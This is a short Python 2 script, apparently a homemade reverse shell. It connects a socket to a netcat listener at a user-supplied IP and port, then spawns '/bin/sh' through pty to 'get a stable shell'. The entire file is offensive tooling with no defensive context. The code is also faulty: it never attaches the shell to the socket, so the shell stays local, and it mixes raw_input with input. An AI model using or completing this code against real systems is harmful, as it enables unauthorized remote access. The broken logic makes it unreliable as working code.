import socket
import pty

srv_addr=raw_input('input the IP of the target: ')
srv_prt=int(input("enter the port number"))

#Connecting to a listening socket with the above input (nc -lvnp <port number>)

my_sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
my_sock.connect((srv_addr,srv_prt))
print(" server connected")

#Get a stable shell 

pty.spawn('/bin/sh')

#msg= input("Message to send:")
#my_sock.sendall(msg.encode())
#my_sock.close()